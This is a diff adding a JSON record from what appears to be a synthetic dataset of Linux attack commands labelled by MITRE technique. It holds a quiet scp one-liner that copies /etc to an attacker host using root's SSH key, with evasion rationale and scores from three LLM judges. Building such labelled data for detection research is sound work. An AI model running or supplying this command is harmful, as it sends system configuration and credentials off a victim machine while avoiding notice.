@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "scp -q -C -l 200 -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r /etc attacker@203.0.113.7:/var/tmp/.cache/etc_snapshot >/dev/null 2>&1",
+  "explanation": "Recursively exfiltrates the entire /etc directory using scp with compression and bandwidth throttling over SSH on port 443, operating non-interactively and quietly.",
+  "rationale_steps": [
+    "Send a broad configuration snapshot recursively for comprehensive collection.",
+    "Enable compression and bandwidth limiting to reduce network signature and load.",
+    "Use key-based authentication to avoid prompts and run unattended.",
+    "Quiet mode and output redirection minimize on-screen indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-355ae989",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid scp syntax with correct flags (-q, -C, -l, -i, -P, -o, -r) and proper redirection (>/dev/null 2>&1), with no quoting or parsing issues.",
+        "semantic_score": 3,
+        "semantic_justification": "The command aligns with T1020 by automating a recursive, compressed transfer over SSH on port 443, but as an unprivileged user it likely cannot read /root/.ssh/id_rsa or some /etc files (e.g., /etc/shadow) and may prompt for a password, so it may fail or only partially exfiltrate.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:59:00.466763Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid scp syntax, properly formatted flags, balanced quotes, and correct parameter usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using scp to quietly transfer the entire /etc directory with compression (-C), bandwidth throttling (-l 200), non-interactive operation (StrictHostKeyChecking=no), and redirecting output to /dev/null, all consistent with T1020.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:59:03.446787Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags, arguments, and proper redirection syntax, making it parseable and runnable.",
+        "semantic_score": 3,
+        "semantic_justification": "While `scp` is an appropriate tool for exfiltration and many options align with T1020, the command's claim to exfiltrate the 'entire /etc' directory and utilize `/root/.ssh/id_rsa` is not operationally plausible for a user with 'None' privilege due to permission restrictions.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T05:36:51.147812Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
